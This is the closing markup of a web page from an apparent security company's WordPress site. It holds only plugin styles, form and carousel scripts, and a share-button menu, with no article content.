(prefers-reduced-motion:no-preference){.wp-lightbox-overlay.zoom.active{animation:none;opacity:1;visibility:visible}.wp-lightbox-overlay.zoom.active .lightbox-image-container{animation:lightbox-zoom-in .4s}.wp-lightbox-overlay.zoom.active .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.active .scrim{animation:turn-on-visibility .4s forwards}.wp-lightbox-overlay.zoom.hideanimationenabled:not(.active){animation:none}.wp-lightbox-overlay.zoom.hideanimationenabled:not(.active) .lightbox-image-container{animation:lightbox-zoom-out .4s}.wp-lightbox-overlay.zoom.hideanimationenabled:not(.active) .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.hideanimationenabled:not(.active) .scrim{animation:turn-off-visibility .4s forwards}}@keyframes turn-on-visibility{0%{opacity:0}to{opacity:1}}@keyframes turn-off-visibility{0%{opacity:1;visibility:visible}99%{opacity:0;visibility:visible}to{opacity:0;visibility:hidden}}@keyframes lightbox-zoom-in{0%{transform:translate(calc(-50vw + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale))}to{transform:translate(-50%,-50%) scale(1)}}@keyframes lightbox-zoom-out{0%{transform:translate(-50%,-50%) scale(1);visibility:visible}99%{visibility:visible}to{transform:translate(calc(-50vw + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale));visibility:hidden}}
</style>
<style id="wp-block-embed-inline-css">
.wp-block-embed.alignleft,.wp-block-embed.alignright,.wp-block[data-align=left]>[data-type="core/embed"],.wp-block[data-align=right]>[data-type="core/embed"]{max-width:360px;width:100%}.wp-block-embed.alignleft .wp-block-embed__wrapper,.wp-block-embed.alignright .wp-block-embed__wrapper,.wp-block[data-align=left]>[data-type="core/embed"] .wp-block-embed__wrapper,.wp-block[data-align=right]>[data-type="core/embed"] .wp-block-embed__wrapper{min-width:280px}.wp-block-cover .wp-block-embed{min-height:240px;min-width:320px}.wp-block-embed{overflow-wrap:break-word}.wp-block-embed figcaption{margin-bottom:1em;margin-top:.5em}.wp-block-embed iframe{max-width:100%}.wp-block-embed__wrapper{position:relative}.wp-embed-responsive .wp-has-aspect-ratio .wp-block-embed__wrapper:before{content:"";display:block;padding-top:50%}.wp-embed-responsive .wp-has-aspect-ratio iframe{bottom:0;height:100%;left:0;position:absolute;right:0;top:0;width:100%}.wp-embed-responsive .wp-embed-aspect-21-9 .wp-block-embed__wrapper:before{padding-top:42.85%}.wp-embed-responsive .wp-embed-aspect-18-9 .wp-block-embed__wrapper:before{padding-top:50%}.wp-embed-responsive .wp-embed-aspect-16-9 .wp-block-embed__wrapper:before{padding-top:56.25%}.wp-embed-responsive .wp-embed-aspect-4-3 .wp-block-embed__wrapper:before{padding-top:75%}.wp-embed-responsive .wp-embed-aspect-1-1 .wp-block-embed__wrapper:before{padding-top:100%}.wp-embed-responsive .wp-embed-aspect-9-16 .wp-block-embed__wrapper:before{padding-top:177.77%}.wp-embed-responsive .wp-embed-aspect-1-2 .wp-block-embed__wrapper:before{padding-top:200%}
</style>
<style id="kevinbatdorf-code-block-pro-style-inline-css">
.wp-block-kevinbatdorf-code-block-pro{box-sizing:border-box!important;direction:ltr!important;font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;position:relative!important}.wp-block-kevinbatdorf-code-block-pro *{box-sizing:border-box!important}.wp-block-kevinbatdorf-code-block-pro pre,.wp-block-kevinbatdorf-code-block-pro pre *{font-size:inherit!important;line-height:inherit!important}.wp-block-kevinbatdorf-code-block-pro:not(.code-block-pro-editor) pre{--tw-shadow:0 0 #0000!important;--tw-shadow-colored:0 0 #0000!important;background-image:none!important;border:0!important;border-radius:0!important;border-style:none!important;border-width:0!important;box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)!important;color:inherit!important;font-family:inherit!important;margin:0!important;overflow:auto!important;overflow-wrap:normal!important;padding:16px 0 16px 16px!important;text-align:left!important;white-space:pre!important}.wp-block-kevinbatdorf-code-block-pro.padding-disabled:not(.code-block-pro-editor) pre{padding:0!important}.wp-block-kevinbatdorf-code-block-pro.padding-bottom-disabled pre{padding-bottom:0!important}.wp-block-kevinbatdorf-code-block-pro:not(.code-block-pro-editor) pre code{--tw-shadow:0 0 #0000!important;--tw-shadow-colored:0 0 #0000!important;background:none!important;background-color:transparent!important;border:0!important;border-radius:0!important;border-style:none!important;border-width:0!important;box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)!important;color:inherit!important;display:block!important;font-family:inherit!important;margin:0!important;overflow-wrap:normal!important;padding:0!important;text-align:left!important;white-space:pre!important;width:100%!important}.wp-block-kevinbatdorf-code-block-pro:not(.code-block-pro-editor) pre code .line{display:inline-block!important;min-width:var(--cbp-block-width,100%)!important;vertical-align:top!important}.wp-block-kevinbatdorf-code-block-pro.cbp-has-line-numbers:not(.code-block-pro-editor) pre code .line{padding-left:calc(12px + var(--cbp-line-number-width, auto))!important}.wp-block-kevinbatdorf-code-block-pro.cbp-has-line-numbers:not(.code-block-pro-editor) pre code{counter-increment:step calc(var(--cbp-line-number-start, 1) - 1)!important;counter-reset:step!important}.wp-block-kevinbatdorf-code-block-pro pre code .line{position:relative!important}.wp-block-kevinbatdorf-code-block-pro:not(.code-block-pro-editor) pre code .line:before{content:""!important;display:inline-block!important}.wp-block-kevinbatdorf-code-block-pro.cbp-has-line-numbers:not(.code-block-pro-editor) pre code .line:not(.cbp-line-number-disabled):before{color:var(--cbp-line-number-color,#999)!important;content:counter(step)!important;counter-increment:step!important;left:0!important;opacity:.5!important;position:absolute!important;text-align:right!important;transition-duration:.5s!important;transition-property:opacity!important;transition-timing-function:cubic-bezier(.4,0,.2,1)!important;-webkit-user-select:none!important;-moz-user-select:none!important;user-select:none!important;width:var(--cbp-line-number-width,auto)!important}.wp-block-kevinbatdorf-code-block-pro.cbp-highlight-hover .line{min-height:var(--cbp-block-height,100%)!important}.wp-block-kevinbatdorf-code-block-pro .line.cbp-line-highlight .cbp-line-highlighter,.wp-block-kevinbatdorf-code-block-pro .line.cbp-no-blur:hover .cbp-line-highlighter,.wp-block-kevinbatdorf-code-block-pro.cbp-highlight-hover:not(.cbp-blur-enabled:not(.cbp-unblur-on-hover)) .line:hover .cbp-line-highlighter{background:var(--cbp-line-highlight-color,rgb(14 165 233/.2))!important;left:-16px!important;min-height:var(--cbp-block-height,100%)!important;min-width:calc(var(--cbp-block-width, 100%) + 16px)!important;pointer-events:none!important;position:absolute!important;top:0!important;width:100%!important}[data-code-block-pro-font-family="Code-Pro-Comic-Mono.ttf"].wp-block-kevinbatdorf-code-block-pro .line.cbp-line-highlight .cbp-line-highlighter,[data-code-block-pro-font-family="Code-Pro-Comic-Mono.ttf"].wp-block-kevinbatdorf-code-block-pro .line.cbp-no-blur:hover .cbp-line-highlighter,[data-code-block-pro-font-family="Code-Pro-Comic-Mono.ttf"].wp-block-kevinbatdorf-code-block-pro.cbp-highlight-hover:not(.cbp-blur-enabled:not(.cbp-unblur-on-hover)) .line:hover .cbp-line-highlighter{top:-.125rem!important}[data-code-block-pro-font-family=Code-Pro-Fira-Code].wp-block-kevinbatdorf-code-block-pro .line.cbp-line-highlight .cbp-line-highlighter,[data-code-block-pro-font-family=Code-Pro-Fira-Code].wp-block-kevinbatdorf-code-block-pro .line.cbp-no-blur:hover .cbp-line-highlighter,[data-code-block-pro-font-family=Code-Pro-Fira-Code].wp-block-kevinbatdorf-code-block-pro.cbp-highlight-hover:not(.cbp-blur-enabled:not(.cbp-unblur-on-hover)) .line:hover .cbp-line-highlighter{top:-1.5px!important}[data-code-block-pro-font-family="Code-Pro-Deja-Vu-Mono.ttf"].wp-block-kevinbatdorf-code-block-pro .line.cbp-line-highlight .cbp-line-highlighter,[data-code-block-pro-font-family="Code-Pro-Deja-Vu-Mono.ttf"].wp-block-kevinbatdorf-code-block-pro .line.cbp-no-blur:hover .cbp-line-highlighter,[data-code-block-pro-font-family="Code-Pro-Deja-Vu-Mono.ttf"].wp-block-kevinbatdorf-code-block-pro.cbp-highlight-hover:not(.cbp-blur-enabled:not(.cbp-unblur-on-hover)) .line:hover .cbp-line-highlighter,[data-code-block-pro-font-family=Code-Pro-Cozette].wp-block-kevinbatdorf-code-block-pro .line.cbp-line-highlight .cbp-line-highlighter,[data-code-block-pro-font-family=Code-Pro-Cozette].wp-block-kevinbatdorf-code-block-pro .line.cbp-no-blur:hover .cbp-line-highlighter,[data-code-block-pro-font-family=Code-Pro-Cozette].wp-block-kevinbatdorf-code-block-pro.cbp-highlight-hover:not(.cbp-blur-enabled:not(.cbp-unblur-on-hover)) .line:hover .cbp-line-highlighter{top:-1px!important}.wp-block-kevinbatdorf-code-block-pro:not(.code-block-pro-editor).padding-disabled pre .line.cbp-line-highlight:after{left:0!important;width:100%!important}.wp-block-kevinbatdorf-code-block-pro.cbp-blur-enabled pre .line:not(.cbp-no-blur){filter:blur(1px)!important;opacity:.4!important;pointer-events:none!important;transition-duration:.2s!important;transition-property:all!important;transition-timing-function:cubic-bezier(.4,0,.2,1)!important}.wp-block-kevinbatdorf-code-block-pro.cbp-blur-enabled.cbp-unblur-on-hover:hover pre .line:not(.cbp-no-blur){--tw-blur:blur(0)!important;filter:var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)!important;opacity:1!important;pointer-events:auto!important}.wp-block-kevinbatdorf-code-block-pro:not(.code-block-pro-editor) pre *{font-family:inherit!important}.cbp-see-more-simple-btn-hover{transition-property:none!important}.cbp-see-more-simple-btn-hover:hover{box-shadow:inset 0 0 100px 100px hsla(0,0%,100%,.1)!important}.code-block-pro-copy-button{background:none!important;background-color:transparent!important;border:0!important;border-style:none!important;border-width:0!important;cursor:pointer!important;left:auto!important;line-height:1!important;opacity:.1!important;padding:6px!important;position:absolute!important;right:0!important;top:0!important;transition-duration:.2s!important;transition-property:opacity!important;transition-timing-function:cubic-bezier(.4,0,.2,1)!important;z-index:10!important}.code-block-pro-copy-button:focus{opacity:.4!important}.wp-block-kevinbatdorf-code-block-pro.padding-disabled .code-block-pro-copy-button{padding:0!important}.wp-block-kevinbatdorf-code-block-pro:hover .code-block-pro-copy-button{opacity:.5!important}.wp-block-kevinbatdorf-code-block-pro .code-block-pro-copy-button:hover{opacity:.9!important}.code-block-pro-copy-button .without-check{display:block!important}.code-block-pro-copy-button .with-check,.code-block-pro-copy-button.cbp-copying .without-check{display:none!important}.code-block-pro-copy-button.cbp-copying .with-check{display:block!important}.cbp-footer-link:hover{text-decoration-line:underline!important}

</style>
<link rel="stylesheet" id="gform_basic-css" href="https://shorsec.io/wp-content/plugins/gravityforms/assets/css/dist/basic.min.css?ver=2.7.17" media="all">
<link rel="stylesheet" id="gform_theme_components-css" href="https://shorsec.io/wp-content/plugins/gravityforms/assets/css/dist/theme-components.min.css?ver=2.7.17" media="all">
<link rel="stylesheet" id="gform_theme_ie11-css" href="https://shorsec.io/wp-content/plugins/gravityforms/assets/css/dist/theme-ie11.min.css?ver=2.7.17" media="all">
<link rel="stylesheet" id="gform_theme-css" href="https://shorsec.io/wp-content/plugins/gravityforms/assets/css/dist/theme.min.css?ver=2.7.17" media="all">
<script src="https://shorsec.io/wp-content/plugins/code-block-pro/build/front/front.js?ver=8eb026fbc72eb8ed3635" id="kevinbatdorf-code-block-pro-view-script-js" data-wp-strategy="defer"></script>
<script id="kevinbatdorf-code-block-pro-view-script-js-after">
window.codeBlockPro = {"pluginUrl":"https:\/\/shorsec.io\/wp-content\/plugins\/code-block-pro\/"};
</script>
<script src="https://shorsec.io/wp-includes/js/dist/vendor/wp-polyfill-inert.min.js?ver=3.1.2" id="wp-polyfill-inert-js"></script>
<script src="https://shorsec.io/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.14.0" id="regenerator-runtime-js"></script>
<script src="https://shorsec.io/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0" id="wp-polyfill-js"></script>
<script src="https://shorsec.io/wp-includes/js/dist/dom-ready.min.js?ver=392bdd43726760d1f3ca" id="wp-dom-ready-js"></script>
<script src="https://shorsec.io/wp-includes/js/dist/hooks.min.js?ver=c6aec9a8d4e5a5d543a1" id="wp-hooks-js"></script>
<script src="https://shorsec.io/wp-includes/js/dist/i18n.min.js?ver=7701b0c3857f914212ef" id="wp-i18n-js"></script>
<script id="wp-i18n-js-after">
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
</script>
<script src="https://shorsec.io/wp-includes/js/dist/a11y.min.js?ver=7032343a947cfccf5608" id="wp-a11y-js"></script>
<script defer="defer" src="https://shorsec.io/wp-content/plugins/gravityforms/js/jquery.json.min.js?ver=2.7.17" id="gform_json-js"></script>
<script id="gform_gravityforms-js-extra">
var gform_i18n = {"datepicker":{"days":{"monday":"Mo","tuesday":"Tu","wednesday":"We","thursday":"Th","friday":"Fr","saturday":"Sa","sunday":"Su"},"months":{"january":"January","february":"February","march":"March","april":"April","may":"May","june":"June","july":"July","august":"August","september":"September","october":"October","november":"November","december":"December"},"firstDay":0,"iconText":"Select date"}};
var gf_legacy_multi = [];
var gform_gravityforms = {"strings":{"invalid_file_extension":"This type of file is not allowed. Must be one of the following:","delete_file":"Delete this file","in_progress":"in progress","file_exceeds_limit":"File exceeds size limit","illegal_extension":"This type of file is not allowed.","max_reached":"Maximum number of files reached","unknown_error":"There was a problem while saving the file on the server","currently_uploading":"Please wait for the uploading to complete","cancel":"Cancel","cancel_upload":"Cancel this upload","cancelled":"Cancelled"},"vars":{"images_url":"https:\/\/shorsec.io\/wp-content\/plugins\/gravityforms\/images"}};
var gf_global = {"gf_currency_config":{"name":"U.S. Dollar","symbol_left":"$","symbol_right":"","symbol_padding":"","thousand_separator":",","decimal_separator":".","decimals":2,"code":"USD"},"base_url":"https:\/\/shorsec.io\/wp-content\/plugins\/gravityforms","number_formats":[],"spinnerUrl":"https:\/\/shorsec.io\/wp-content\/plugins\/gravityforms\/images\/spinner.svg","version_hash":"9c0ddd6a6220b6820480527bea72c5e9","strings":{"newRowAdded":"New row added.","rowRemoved":"Row removed","formSaved":"The form has been saved.  The content contains the link to return and complete the form."}};
</script>
<script defer="defer" src="https://shorsec.io/wp-content/plugins/gravityforms/js/gravityforms.min.js?ver=2.7.17" id="gform_gravityforms-js"></script>
<script defer="defer" src="https://shorsec.io/wp-content/plugins/gravityforms/js/placeholders.jquery.min.js?ver=2.7.17" id="gform_placeholder-js"></script>
<script defer="defer" src="https://shorsec.io/wp-content/plugins/gravityforms/assets/js/dist/utils.min.js?ver=59d951b75d934ae23e0ea7f9776264aa" id="gform_gravityforms_utils-js"></script>
<script defer="defer" src="https://shorsec.io/wp-content/plugins/gravityforms/assets/js/dist/vendor-theme.min.js?ver=4ef53fe41c14a48b294541d9fc37387e" id="gform_gravityforms_theme_vendors-js"></script>
<script id="gform_gravityforms_theme-js-extra">
var gform_theme_config = {"common":{"form":{"honeypot":{"version_hash":"9c0ddd6a6220b6820480527bea72c5e9"}}},"hmr_dev":"","public_path":"https:\/\/shorsec.io\/wp-content\/plugins\/gravityforms\/assets\/js\/dist\/"};
</script>
<script defer="defer" src="https://shorsec.io/wp-content/plugins/gravityforms/assets/js/dist/scripts-theme.min.js?ver=f4d12a887a23a8c5755fd2b956bc8fcf" id="gform_gravityforms_theme-js"></script>
<script type="text/javascript" id="ct-footer-js"></script><!-- start Simple Custom CSS and JS -->
<script>
//
//   Variables
//
//////////////////////////////////////////////////////////////////////

// Play with this value to change the speed
let tickerSpeed = 0.3;

let flickity = null;
let isPaused = false;
const slideshowEl = document.querySelector('.logo-carousel');


//
//   Functions
//
//////////////////////////////////////////////////////////////////////

const update = () => {
  if (isPaused) return;
  if (flickity.slides) {
    flickity.x = (flickity.x - tickerSpeed) % flickity.slideableWidth;
    flickity.selectedIndex = flickity.dragEndRestingSelect();
    flickity.updateSelectedSlide();
    flickity.settle(flickity.x);
  }
  window.requestAnimationFrame(update);
};

const pause = () => {
  isPaused = true;
};

const play = () => {
  if (isPaused) {
    isPaused = false;
    window.requestAnimationFrame(update);
  }
};


//
//   Create Flickity
//
//////////////////////////////////////////////////////////////////////

flickity = new Flickity(slideshowEl, {
  autoPlay: false,
  prevNextButtons: false,
  pageDots: false,
	imagesLoaded: true,
  draggable: true,
  wrapAround: true,
  selectedAttraction: 0.015,
  friction: 0.25 });

flickity.x = 0;


//
//   Add Event Listeners
//
//////////////////////////////////////////////////////////////////////

slideshowEl.addEventListener('mouseenter', pause, false);
slideshowEl.addEventListener('focusin', pause, false);
slideshowEl.addEventListener('mouseleave', play, false);
slideshowEl.addEventListener('focusout', play, false);

flickity.on('dragStart', () => {
  isPaused = true;
});


//
//   Start Ticker
//
//////////////////////////////////////////////////////////////////////

update();</script>
<!-- end Simple Custom CSS and JS -->
<!-- start Simple Custom CSS and JS -->
<script>
var elem = document.querySelector('.main-carousel');
var flkty = new Flickity( elem, {
  // options
  cellAlign: 'left',
  contain: true,
	wrapAround: true,
	pageDots: false,
	imagesLoaded: true
});</script>
<!-- end Simple Custom CSS and JS -->
<!-- start Simple Custom CSS and JS -->
<script>
/**
 * Sticky JS
 */
/* set the element you want to make sticky */
const headerElem = document.getElementsByTagName("header")[0];
/* set the offset on which the hide effect has to wait */
const scrollOffset = 0;
/* DO NOT MODIFY BELOW */
/* get the current page position */
let prevScrollpos = window.pageYOffset;
/* monitor when the page is being scrolled */
window.addEventListener('scroll', () => {
    /* check if the scroll offset is passed */
    if (window.pageYOffset > scrollOffset) {
        /* get the new page position after scrolling */
        let currentScrollPos = window.pageYOffset;
        /* check the new page position with the old position */
        if (prevScrollpos > currentScrollPos) {
            /* if scrolling UP, show the sticky element */
            headerElem.classList.add("oxy-sticky-header-active")
        } else {
            /* if scrolling DOWN, hide the sticky element */
			headerElem.classList.add("oxy-sticky-header");
            headerElem.classList.remove("oxy-sticky-header-active")
        }
        /* set the page position, so it can be checked the next time */
        prevScrollpos = currentScrollPos; 
		
		if(window.pageYOffset < 300) {
			headerElem.classList.remove("oxy-sticky-header", "oxy-sticky-header-active");
			
		}
    }
});</script>
<!-- end Simple Custom CSS and JS -->
<!-- start Simple Custom CSS and JS -->
<script>
jQuery(document).ready(function( $ ){
   let header = document.querySelector('.oxy-header-wrapper');
   let mobileMenuToggle = document.querySelector('.toggle-menu');
	let menuItemWithSubmenu = document.querySelector('.has-submenu');
	let closeMbMenu = document.querySelector('.close-mb-menu');
	
	mobileMenuToggle.addEventListener('click', () => {
		header.classList.toggle('menu-active');
		document.body.classList.toggle('menu-active');
	})
	
	closeMbMenu.addEventListener('click', () => {
		header.classList.toggle('menu-active');
		document.body.classList.toggle('menu-active');
	})
	
	menuItemWithSubmenu.addEventListener('click', () => {
		menuItemWithSubmenu.classList.toggle('submenu-active');
	})
	
	
});

</script>
<!-- end Simple Custom CSS and JS -->
<!-- start Simple Custom CSS and JS -->
<style>
.flickity-viewport {
  width: 100%;
}

.carousel-cell {
  	width: calc(100% / 3 - 20px);
	height: auto;
	margin-right: 30px;
	min-height: 100%;
	justify-content: stretch;
}

.flickity-prev-next-button.next {
  right: -40px;
}

.flickity-prev-next-button.previous {
  left: -40px;
}

.flickity-prev-next-button {
  width: 32px;
  height: 32px;
  border-radius: 5px;
}

.flickity-button:hover {
  background: rgba(206, 24, 30, 0.9);
  cursor: pointer;
}

.flickity-button {
  background: rgb(206, 24, 30);
  color: #fff;
}

.flickity-button:focus {
  box-shadow: none;
}

@media (max-width: 1340px) {
	.flickity-prev-next-button.next {
  		right: -20px;
	}
	.flickity-prev-next-button.previous {
  		left: -20px;
	}
}



@media (max-width: 992px) {
	.carousel-cell {
  	width: calc(100% / 3 - 7px);
	margin-right: 10px;
}

}

@media (max-width: 768px) {
	.carousel-cell {
  	width: calc(100% / 2 - 7px);
	margin-right: 10px;
}
}

@media (max-width: 480px) {
	.carousel-cell {
  	width: 80%;
	margin-right: 10px;
}
}
</style>
<!-- end Simple Custom CSS and JS -->
<script>
gform.initializeOnLoaded( function() { jQuery(document).on('gform_post_render', function(event, formId, currentPage){if(formId == 1) {if(typeof Placeholders != 'undefined'){
                        Placeholders.enable();
                    }} } );jQuery(document).on('gform_post_conditional_logic', function(event, formId, fields, isInit){} ) } );
</script>
<script>
gform.initializeOnLoaded( function() {jQuery(document).trigger('gform_post_render', [1, 1]);gform.utils.trigger({ event: 'gform/postRender', native: false, data: { formId: 1, currentPage: 1 } });} );
</script>
<!-- /WP_FOOTER --> 

<div style="position: static;"><div class="a2a_overlay" id="a2a_overlay"></div><div id="a2a_modal" class="a2a_modal a2a_hide" role="dialog" tabindex="-1" aria-label=""><div class="a2a_modal_body a2a_menu a2a_hide" id="a2a_copy_link"><span id="a2a_copy_link_icon" class="a2a_svg a2a_s_link a2a_logo_color"><svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" d="M7.591 21.177c0-.36.126-.665.377-.917l2.804-2.804a1.235 1.235 0 0 1 .913-.378c.377 0 .7.144.97.43-.026.028-.11.11-.255.25-.144.14-.24.236-.29.29a2.82 2.82 0 0 0-.2.256 1.056 1.056 0 0 0-.177.344 1.43 1.43 0 0 0-.046.37c0 .36.126.666.377.918a1.25 1.25 0 0 0 .918.377c.126.001.251-.015.373-.047.125-.037.242-.096.345-.175.09-.06.176-.127.256-.2.1-.094.196-.19.29-.29.14-.142.223-.23.25-.254.297.28.445.607.445.984 0 .36-.126.664-.377.916l-2.778 2.79a1.242 1.242 0 0 1-.917.364c-.36 0-.665-.118-.917-.35l-1.982-1.97a1.223 1.223 0 0 1-.378-.9l-.001-.004Zm9.477-9.504c0-.36.126-.665.377-.917l2.777-2.79a1.235 1.235 0 0 1 .913-.378c.35 0 .656.12.917.364l1.984 1.968c.254.252.38.553.38.903 0 .36-.126.665-.38.917l-2.802 2.804a1.238 1.238 0 0 1-.916.364c-.377 0-.7-.14-.97-.418.026-.027.11-.11.255-.25a7.5 7.5 0 0 0 .29-.29c.072-.08.139-.166.2-.255.08-.103.14-.22.176-.344.032-.12.048-.245.047-.37 0-.36-.126-.662-.377-.914a1.247 1.247 0 0 0-.917-.377c-.136 0-.26.015-.37.046-.114.03-.23.09-.346.175a3.868 3.868 0 0 0-.256.2c-.054.05-.15.148-.29.29-.14.146-.222.23-.25.258-.294-.278-.442-.606-.442-.983v-.003ZM5.003 21.177c0 1.078.382 1.99 1.146 2.736l1.982 1.968c.745.75 1.658 1.12 2.736 1.12 1.087 0 2.004-.38 2.75-1.143l2.777-2.79c.75-.747 1.12-1.66 1.12-2.737 0-1.106-.392-2.046-1.183-2.818l1.186-1.185c.774.79 1.708 1.186 2.805 1.186 1.078 0 1.995-.376 2.75-1.13l2.803-2.81c.751-.754 1.128-1.671 1.128-2.748 0-1.08-.382-1.993-1.146-2.738L23.875 6.12C23.13 5.372 22.218 5 21.139 5c-1.087 0-2.004.382-2.75 1.146l-2.777 2.79c-.75.747-1.12 1.66-1.12 2.737 0 1.105.392 2.045 1.183 2.817l-1.186 1.186c-.774-.79-1.708-1.186-2.805-1.186-1.078 0-1.995.377-2.75 1.132L6.13 18.426c-.754.755-1.13 1.672-1.13 2.75l.003.001Z"></path></svg></span><input id="a2a_copy_link_text" type="text" title="Copy link" readonly=""><div id="a2a_copy_link_copied">✓</div></div><div class="a2a_modal_body a2a_menu a2a_thanks a2a_hide" id="a2a_thanks"><div class="a2a_localize" data-a2a-localize="inner,ThanksForSharing">Dziękuję za udostępnienie</div></div></div><div class="a2a_menu a2a_full a2a_localize" id="a2apage_full" role="dialog" tabindex="-1" aria-label="Share" data-a2a-localize="title,Share" title="Podziel się"><div class="a2a_full_header"><div id="a2apage_find_container" class="a2a_menu_find_container"><input id="a2apage_find" class="a2a_menu_find a2a_localize" type="text" autocomplete="off" title="ZnajdĽ serwis, do którego chcesz dodać treść" data-a2a-localize="title,FindAnyServiceToAddTo"><span id="a2apage_find_icon" class="a2a_svg a2a_s_find"><svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#CCC" d="M19.7 18.2l-4.5-4.5c.7-1.1 1.2-2.3 1.2-3.6 0-3.5-2.8-6.3-6.3-6.3s-6.3 2.8-6.3 6.3 2.8 6.3 6.3 6.3c1.4 0 2.6-.4 3.6-1.2l4.5 4.5c.6.6 1.3.7 1.7.2.5-.4.4-1.1-.2-1.7zm-9.6-3.6c-2.5 0-4.5-2.1-4.5-4.5 0-2.5 2.1-4.5 4.5-4.5 2.5 0 4.5 2.1 4.5 4.5s-2 4.5-4.5 4.5z"></path></svg></span></div></div><div class="a2a_full_services" id="a2apage_full_services" role="presentation"></div><div class="a2a_full_footer"><a href="https://www.addtoany.com" title="Share Buttons" rel="noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_a2a a2a_logo_color"><svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g fill="#FFF"><path d="M14 7h4v18h-4z"></path><path d="M7 14h18v4H7z"></path></g></svg></span>AddToAny</a></div></div><div id="a2apage_dropdown" class="a2a_menu a2a_mini a2a_localize a2a_hide" tabindex="-1" aria-label="Podziel się" data-a2a-localize="label,Share"><div class="a2a_mini_services" id="a2apage_mini_services"></div><div id="a2apage_cols_container" class="a2a_cols_container"><div class="a2a_col1" id="a2apage_col1"></div><div id="a2apage_2_col1" class="a2a_hide"></div><div class="a2a_clear"></div></div><div class="a2apage_wide a2a_wide"><a href="#addtoany" id="a2apage_show_more_less" class="a2a_more a2a_localize" title="Pokaż wszystko" data-a2a-localize="title,ShowAll"><span class="a2a_svg a2a_s__default a2a_s_a2a a2a_logo_color"><svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g fill="#FFF"><path d="M14 7h4v18h-4z"></path><path d="M7 14h18v4H7z"></path></g></svg></span><span class="a2a_localize" data-a2a-localize="inner,More">Więcej…</span></a></div></div><div style="height: 1px; width: 1px; position: absolute; z-index: 100000; top: 0px; visibility: hidden;"><iframe id="a2a_sm_ifr" style="height: 1px; width: 1px; border: 0px; left: 0px; top: 0px; position: absolute; z-index: 100000; display: none;" title="AddToAny Utility Frame" aria-hidden="true" src="https://static.addtoany.com/menu/sm.25.html#type=core&amp;event=load" data-lf-form-tracking-inspected-xbp1oaenreg8edvj="true" data-lf-yt-playback-inspected-xbp1oaenreg8edvj="true" data-lf-vimeo-playback-inspected-xbp1oaenreg8edvj="true"></iframe></div></div><script src="https://static.addtoany.com/menu/locale/pl.js"></script><p id="a11y-speak-intro-text" class="a11y-speak-intro-text" style="position: absolute;margin: -1px;padding: 0;height: 1px;width: 1px;overflow: hidden;clip: rect(1px, 1px, 1px, 1px);-webkit-clip-path: inset(50%);clip-path: inset(50%);border: 0;word-wrap: normal !important;" hidden="hidden">Notifications</p><div id="a11y-speak-assertive" class="a11y-speak-region" style="position: absolute;margin: -1px;padding: 0;height: 1px;width: 1px;overflow: hidden;clip: rect(1px, 1px, 1px, 1px);-webkit-clip-path: inset(50%);clip-path: inset(50%);border: 0;word-wrap: normal !important;" aria-live="assertive" aria-relevant="additions text" aria-atomic="true"></div><div id="a11y-speak-polite" class="a11y-speak-region" style="position: absolute;margin: -1px;padding: 0;height: 1px;width: 1px;overflow: hidden;clip: rect(1px, 1px, 1px, 1px);-webkit-clip-path: inset(50%);clip-path: inset(50%);border: 0;word-wrap: normal !important;" aria-live="polite" aria-relevant="additions text" aria-atomic="true"></div></body></html>